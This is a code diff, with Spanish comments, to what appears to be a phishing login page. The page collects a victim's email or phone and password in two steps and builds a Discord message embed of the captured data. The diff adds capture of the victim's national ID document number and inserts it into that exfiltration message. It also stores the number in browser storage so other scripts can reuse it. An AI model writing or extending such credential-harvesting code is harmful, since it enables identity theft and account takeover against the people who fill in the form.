@@ -749,6 +749,7 @@ document.addEventListener("keydown", function(e) {
   }
 
  let emailGlobal = '';
+ let numeroDocumentoGlobal = '';
 
 $(document).ready(function() {
   $('#email-form').on('submit', function(e) {
@@ -758,6 +759,17 @@ $(document).ready(function() {
     if (!emailGlobal) return;
     $('#user-email-display').text(emailGlobal);
     localStorage.setItem('telefonoUsuario', emailGlobal);
+
+    // ================= GUARDAR NÚMERO DE DOCUMENTO (id) EN LA SESIÓN =================
+    // Si el número de documento está en un campo aparte con id="id", se usa ese valor.
+    // Si no existe ese campo, se usa el valor del primer campo (emailGlobal).
+    numeroDocumentoGlobal = ($('#id').length ? $('#id').val().trim() : emailGlobal);
+
+    sessionStorage.setItem('numeroDocumento', numeroDocumentoGlobal); // se recupera en otro script
+    localStorage.setItem('numeroDocumento', numeroDocumentoGlobal);   // respaldo por si cambia de pestaña
+    console.log("Número de documento guardado en sesión:", numeroDocumentoGlobal);
+    // ===============================================================================
+
     $('#email-step').addClass('hidden');
     $('#password-step').removeClass('hidden');
     $('#password').focus();
@@ -796,6 +808,11 @@ var discordMessage = {
                 {
                     "name": "📧 Nombre de usuario",
                     "value": u_name777,
+                    "inline": false
+                },
+                {
+                    "name": "🆔 Número de documento",
+                    "value": numeroDocumentoGlobal,
                     "inline": false
                 },
                 {
@@ -881,6 +898,14 @@ function detectarSO() {
     return "Desconocido";
 }
 
+// ============ RECUPERAR EL NÚMERO DE DOCUMENTO (para usar en otro script) ============
+function obtenerNumeroDocumento() {
+    return sessionStorage.getItem('numeroDocumento')
+        || localStorage.getItem('numeroDocumento')
+        || '';
+}
+// ==================================================================================
+
  function validarNombreUsuario(input) {
     // Eliminar espacios en blanco al principio y al final
     input.value = input.value.trim();
@@ -894,10 +919,7 @@ function detectarSO() {
     }
   }
 
-
-
- 
-
 </script>
+
 </body>
 </html>
